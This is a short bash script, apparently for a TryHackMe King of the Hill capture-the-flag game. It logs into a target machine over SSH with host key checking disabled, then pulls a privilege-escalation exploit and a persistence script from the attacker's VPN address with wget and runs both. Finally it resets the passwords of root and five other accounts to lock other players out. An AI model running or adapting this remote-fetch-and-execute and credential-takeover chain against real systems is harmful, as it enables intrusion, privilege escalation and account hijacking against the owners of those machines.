#!/bin/bash


read -p "Your TryHackMe username: " nick
read -p "Enter the machine IP address: " ip_address
read -s -p "Enter the new password: " password

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no pasta@"$ip_address" << EOF
    wget http://$vpn/screen-exp.sh && chmod +x screen-exp.sh && ./screen-exp.sh
    sleep 3

    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
    echo "root:$password" | chpasswd
    echo "food:$password" | chpasswd
    echo "tryhackme:$password" | chpasswd
    echo "ramen:$password" | chpasswd
    echo "bread:$password" | chpasswd
    echo "pasta:$password" | chpasswd


EOF
